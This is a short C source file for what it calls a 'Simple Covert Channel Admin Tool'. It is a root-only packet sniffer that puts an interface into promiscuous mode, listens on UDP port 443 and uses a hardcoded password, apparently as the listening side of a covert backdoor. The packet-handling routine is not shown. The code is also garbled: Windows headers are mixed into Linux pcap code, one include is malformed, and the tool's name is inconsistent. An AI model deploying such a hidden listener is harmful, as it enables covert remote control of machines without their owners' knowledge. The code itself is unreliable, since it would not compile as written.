/*	

Title: Hawkx
Simple Covert Channel Admin Tool
Author: Chris Pro
Email: byrosferx@gmail.com
Date: 10/2/2010

Compile: gcc simsim.c -o simsim -lpcap 

*/

#define PASSWORD "pimpim"
#define UDP_PORT "443"

#define SIMSIM_VERSION "0.01"

#include <sys/types.h>
#include <sys/socket.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>

#include <netinet/in_systm.h>
#include <netinet/in.h>
#include <netinet/ip.h>

#include <unistd.h>
#include <netinet/tcp.h>

#include <features.h>
#include <stdio.h>
#include <pcap.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <winbase.h >
#include <unistd.h>
#include <windows.>
#include "simsim.h"

#define MAXBYTES2CAPTURE 2048





int main(int argc, char **argv ){


	char *interface;	// pcap capture interface



	if ( argc == 1 )
	{
	  usage();
	  return;
	}

	/* Run as root or use sudo */
	if(getuid()) { 
		printf("Must run as root!\n");
		return -1;
	}

	/* Set Variables */
	int count=0;
	char filter_exp[16];
	char errbuf[PCAP_ERRBUF_SIZE], *device;
	struct bpf_program fp;
	pcap_t *descr = NULL;
	bpf_u_int32 mask;
	bpf_u_int32 net;

	interface = argv[1];

	memset(errbuf,0,PCAP_ERRBUF_SIZE);
	memset(filter_exp, '\0', sizeof(filter_exp) );

	strcat( filter_exp, "udp port ");
	strcat( filter_exp, UDP_PORT);

	printf("expression: %s\n", filter_exp);

	printf("Opening interface %s\n", interface);
	
	if (pcap_lookupnet( interface, &net, &mask, errbuf) == -1) {
		 fprintf(stderr, "Can't get netmask for interface %s\n", interface);
		 net = 0;
		 mask = 0;
	}

 
	/* Open device in promiscuous mode */
	descr = pcap_open_live(interface, MAXBYTES2CAPTURE, 1, 512, errbuf);
	if ( descr == NULL )
	{
	  printf("Failed opening interface\n");
	  return -1;
	}


	/* Set Packet Filter Expression */
	if (pcap_compile(descr, &fp, filter_exp, 0, net) == -1) {
		 fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(descr));
		 return(2);
	 }
	 if (pcap_setfilter(descr, &fp) == -1) {
		 fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(descr));
		 return(2);
	 }

	/* Loop forever & call processPacket() for every received packet */
	pcap_loop(descr, -1, processPacket, (u_char *) &count);

	return 0;
}

